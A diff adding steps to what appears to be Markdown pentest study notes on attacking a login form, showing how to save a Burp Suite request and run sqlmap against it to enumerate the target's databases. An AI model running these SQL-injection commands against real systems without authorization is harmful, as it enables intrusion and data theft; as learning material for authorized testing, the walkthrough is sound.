@@ -21,3 +21,17 @@ Upgrade-Insecure-Requests: 1
 
 email=admin%40admin.com&password=admin // <--This field its the injection point
 ```
+## 2) Create a .txt file (peticion.txt) and paste the Burpsuite request
+```bash
+nano peticion.txt
+```
+## 3) Use SQLmap with the previouse .txt file (peticion.txt example)
+```bash
+sqlmap -r peticion.txt
+```
+Note: At this point SQLmap would ask if we want to add some extra parameteres.
+Note 2: You can access the output on path: /home/kali/.local/share/sqlmap/output/<target_host_name>
+## 4) Detect the current databases. After this payload we should see at the output the lists of Databases
+```bash
+sqlmap -r peticion.txt -dbs
+```
